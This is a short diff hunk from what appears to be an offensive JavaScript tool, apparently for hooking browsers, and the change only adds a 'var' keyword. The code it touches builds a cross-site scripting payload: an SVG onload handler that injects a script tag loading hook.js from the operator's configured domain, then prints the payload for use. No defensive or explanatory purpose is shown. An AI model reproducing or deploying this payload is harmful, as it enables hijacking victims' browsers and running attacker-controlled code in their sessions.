@@ -149,7 +149,7 @@ function https2http(body) {
 }
 
 /* The payload that downloads mygg */
-var hook = '<svg/onload="x=document.createElement(\'script\');'
+var hook = '<svg/onload="var x=document.createElement(\'script\');'
 var hook = hook + 'x.src="//' + config.web_domain + '/hook.js";document.head.appendChild(x);">'
 console.log("[+] Payload:\r\n" + hook + "\r\n")
 
